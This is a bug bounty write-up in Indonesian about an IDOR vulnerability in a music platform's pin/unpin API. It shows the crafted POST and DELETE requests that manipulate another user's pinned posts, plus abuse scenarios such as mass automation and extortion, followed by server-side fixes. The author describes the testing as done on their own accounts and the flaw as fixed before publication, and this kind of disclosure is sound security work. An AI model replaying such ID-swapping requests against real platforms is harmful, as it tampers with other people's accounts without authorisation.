+++
date = '2025-12-11T12:44:10Z'
draft = false
title = 'How I Hijacked Any Users Pinned Post With A Single IDOR'
+++
Halo semuanya! Saya baru-baru ini menguji sebuah platform musik populer yang berada di bawah program bug bounty private. Dalam pengujian ini, saya menemukan kerentanan IDOR (Insecure Direct Object Reference) kritis yang memungkinkan penyerang untuk memanipulasi postingan yang disematkan (pinned post) di profil pengguna mana pun tanpa izin.

Perhatian saya tertuju pada fitur **Pin to Top.** Fitur ini memungkinkan pengguna untuk menampilkan sebuah postingan secara permanen di bagian paling atas feed profil mereka, menjamin visibilitas maksimum untuk konten penting seperti pengumuman, link album, atau karya terbaik mereka.

## Why This Feature is a Prime Target

Setiap kali ada fitur yang memungkinkan pengguna untuk mengubah status atau tampilan profil mereka (menyematkan, menghapus, mengedit), fitur tersebut adalah target utama untuk kerentanan IDOR. Mengapa? Karena server **wajib memverifikasi** bahwa pengguna yang membuat request adalah pemilik sah dari resource yang sedang diubah. Tanpa verifikasi yang tepat, penyerang dapat memanipulasi data pengguna lain.

## Discovery: Mapping the Normal Request

Langkah pertama saya adalah mengamati bagaimana request yang legitimate bekerja. Saya membuat sebuah postingan uji coba di akun saya sendiri dan menekan tombol "Pin to Top" sambil mencegat traffic menggunakan Burp Suite.

Request untuk menyematkan postingan milik saya sendiri terlihat seperti ini:

```
POST /api/v1.3/users/02400792-9156-47ea-bee7-15376143df16/pins/posts/b8450f98-43a4-f011-8e64-6045bd354e91 HTTP/1.1
Host: www.private.com
Authorization: Bearer <ATTACKER_TOKEN>
Content-Type: application/json

{"entityType":"users","entityId":"02400792-9156-47ea-bee7-15376143df16","id":"b8450f98-43a4-f011-8e64-6045bd354e91"}
```
### Response:

```
HTTP/1.1 204 No Content
```
Status 204 No Content berarti operasi berhasil dilakukan tanpa ada data yang dikembalikan, ini adalah indikator sukses untuk operasi modifikasi.

### Key Observations

Saya segera mencatat dua parameter penting pada path URL:

1. {user_id}: 02400792-9156-47ea-bee7-15376143df16 (ID akun saya)
2. {post_id}: b8450f98-43a4-f011-8e64-6045bd354e91 (ID postingan saya)

Struktur endpoint ini, /users/{user_id}/pins/posts/{post_id}, adalah indikasi klasik bahwa server mungkin hanya mengandalkan ID-ID tersebut untuk otorisasi, tanpa memverifikasi apakah token pengguna yang terotentikasi benar-benar cocok dengan pemilik {user_id} yang ada di path.

**Red Flag:** Jika server tidak melakukan cross-check antara user_id di path dengan user_id yang terkait dengan token Authorization, maka ini adalah celah IDOR yang sempurna.

## Exploitation: From My Pin to Their Pin

Asumsi saya sederhana, dan ini adalah inti dari pengujian IDOR:

*"Jika saya mengubah {user_id} dan {post_id} di path menjadi ID milik target (korban), apakah server akan menerima request tersebut, meskipun token Authorization yang terlampir adalah token dari akun penyerang (saya)?"*

### Ethical Testing Setup

Untuk membuktikan asumsi ini secara etis, saya menggunakan dua akun milik saya sendiri:

* **Akun A (Penyerang):** Akun yang saya gunakan untuk mengirim request
* **Akun B (Korban/Target):** Akun yang akan saya manipulasi

### Step-by-step Exploitation

**1. Mengekstrak ID Target**

Saya membuka profil Akun B dan mengekstrak ID Pengguna serta ID Postingan mereka dengan cara:

* Menekan tombol love reaction pada salah satu postingan
* Mengamati request yang terkirim di Burp Suite

```
POST /api/v1.3/posts/50ef6acd8171401cad898bdca23efe67_b1b7f1063da2f0118e646045bd354e91/reactions/users/02400792 -9156-47ea-bee7-15376143df16 HTTP/1.1
Host: www.private.com
...
```
Dari request ini, saya mendapatkan:

* **ID Pengguna Target (Korban):** 50ef6acd8171401cad898bdca23efe67
* **ID Postingan Target (Korban):** b1b7f1063da2f0118e646045bd354e91

**2. Crafting the Malicious Request**

Saya mengambil request asli dari Akun A (Penyerang) dan mengganti ID-ID tersebut dengan ID milik Akun B (Korban):

![pin post](/images/PIN-post.png)

```
POST /api/v1.3/users/50ef6acd8171401cad898bdca23efe67/pins/posts/b1b7f1063da2f0118e646045bd354e91 HTTP/1.1
Host: www.private.com
Authorization: Bearer <ATTACKER_TOKEN>
Content-Type: application/json

{"entityType":"users","entityId":"50ef6acd8171401cad898bdca23efe67","id":"b1b7f1063da2f0118e646045bd354e91"}>
```
**3. Sending the Request**

Saya meneruskan request di Burp Suite Repeater. Responsnya:

```
HTTP/1.1 204 No Content
```
**Success!** Server menerima request tanpa memvalidasi kepemilikan.

**4. Verification**

Saya mengunjungi halaman profil Akun B. Benar saja, postingan yang saya targetkan kini telah **disematkan (pinned)** di bagian atas feed mereka, sebuah manipulasi yang sepenuhnya dilakukan dari Akun A dengan token yang berbeda.

## Double the Trouble: Unpinning Their Posts

Kerentanan ini bahkan lebih berbahaya karena logika IDOR yang sama berlaku untuk metode DELETE, memungkinkan penyerang untuk **melepas sematan (unpin)** konten penting yang mungkin telah diatur oleh korban.

### Unpinning Proccess

Request untuk menghapus postingan yang disematkan dari profil korban semudah mengubah metode HTTP:

```
DELETE /api/v1.3/users/50ef6acd8171401cad898bdca23efe67/pins/posts/b1b7f1063da2f0118e646045bd354e91 HTTP/1.1
Host: www.private.com
Authorization: Bearer <ATTACKER_TOKEN>>
```
**Response:**

```
HTTP/1.1 204 No Content
```
![unpin posts](/images/UNPIN-post.png)

Request ini berhasil menghapus postingan dari slot yang disematkan di profil korban.

### Attack Scenarios

1. Unpin konten penting korban (pengumuman, link album baru, call-to-action)
2. Pin konten lama/tidak relevan untuk merusak kredibilitas
3. Melakukan spam manipulation dengan pin/unpin berulang kali

## Impact Analysis

Kerentanan IDOR yang ditemukan pada endpoint pins/posts ini memiliki dampak yang **kritis** karena memungkinkan manipulasi visibilitas konten di profil pengguna lain secara tidak sah.

### 1. Manipulasi Konten dan Narasi (Content Manipulation)

**Skenario Nyata:** Bayangkan seorang musisi indie yang menyematkan link pre-order album terbarunya di bagian atas profil. Penyerang dapat:

* Mengganti pin tersebut dengan demo lama yang berkualitas buruk
* Menyematkan postingan kontroversial yang sudah lama untuk merusak reputasi
* Menghilangkan promosi penting menjelang deadline penjualan

**Dampak:** Kerugian finansial, reputasi rusak, dan kehilangan momentum promosi.

### 2. Disrupsi Komunikasi Krusial (Communication Disruption)

**Skenario Nyata:** Seorang creator yang menyematkan pengumuman penting (misalnya: "Konser ditunda karena alasan kesehatan") dapat diserang dengan cara:

* Unpin pengumuman tersebut tanpa sepengetahuan korban
* Ribuan followers tidak mendapat informasi penting
* Menimbulkan kebingungan dan chaos di komunitas

**Dampak:** Gangguan komunikasi massal, potensi kerugian bagi followers, dan kehilangan kepercayaan audiens.

### 3. Pelanggaran Integritas Profil (Profile Integrity Violation)

Kemampuan untuk mengontrol tampilan feed pengguna lain secara langsung merupakan **pelanggaran serius** terhadap:

* User autonomy: Pengguna kehilangan kontrol atas profil mereka sendiri
* Platform trust: Mengurangi kepercayaan terhadap keamanan platform
* Privacy: Penyerang dapat mengetahui dan memanipulasi strategi konten korban

### 4. Potensi Penyalahgunaan Massal (Mass Exploitation Potential)

Dengan kemampuan untuk mengotomatisasi serangan ini, penyerang dapat:

* Menargetkan ratusan akun populer sekaligus
* Membuat chaos di seluruh platform
* Memeras korban (e.g., "Bayar atau profil Anda akan dikacaukan")

### **CVSS Severity Assessment**

Why this is Critical?

* No authentication bypass required: Penyerang hanya perlu akun valid
* No user interaction needed: Korban tidak perlu melakukan apa pun
* Mass exploitation possible: Dapat diotomatisasi
* Direct impact on user data: Merusak integritas profil
* Affects core functionality: Pin to Top adalah fitur penting

## Mitigation (The Fix)

Perbaikan untuk masalah ini harus dilakukan di server-side dengan implementasi **proper authorization checks.**

### Recomended Fix

Sebelum memproses request POST (pin) atau DELETE (unpin) ke endpoint /users/{user_id}/pins/posts/{post_id}, server harus:

1. Verifikasi User ID (Critical)

Prinsip: User hanya boleh memanipulasi resource miliknya sendiri.

2. Verifikasi Kepemilikan Post (Optional but Recommended)

Prinsip: User hanya boleh mem-pin postingan yang mereka buat sendiri (jika ini adalah business logic yang diinginkan).

3. Add Audit Logging

Catat semua operasi pin/unpin untuk forensic analysis

4. Implement Rate Limiting

Untuk mencegah automated mass exploitation:

Maksimal 10 operasi semat/lepas semat per pengguna per jam

## Conclusion

Apa yang awalnya hanya iseng menguji fitur "Pin to Top" ternyata berujung pada penemuan kerentanan kritis yang dapat memengaruhi seluruh pengguna platform. Ini membuktikan bahwa **kerentanan serius sering kali bersembunyi di fitur-fitur yang tampaknya paling sederhana.**

Saya sangat menghargai respons cepat dari tim keamanan (private program) yang segera memvalidasi dan memperbaiki kerentanan ini dalam waktu kurang dari 1 minggu. Proses penanganan bug yang efisien seperti ini menunjukkan komitmen mereka terhadap keamanan pengguna.

### Final Thoughts

Bagi siapa pun yang membaca writeup ini, saya harap cerita ini memberikan pandangan jelas tentang:

* Bagaimana kerentanan IDOR yang "dasar" dapat membawa dampak kritis
* Pentingnya authorization checks di setiap endpoint yang memodifikasi data
* Proses ethical disclosure yang bertanggung jawab

**Keep hacking ethically, stay curious, and always protect user data!**

---

Kerentanan ini telah dilaporkan melalui program bug bounty resmi dan telah diperbaiki sebelum writeup ini dipublikasikan. Tidak ada pengguna yang dirugikan selama proses pengujian.

Akhir kata, terima kasih sudah meluangkan waktu untuk membaca. Jika artikel ini bermanfaat, jangan ragu untuk di share. Sampai jumpa di writeups berikutnya!

Have a good day!
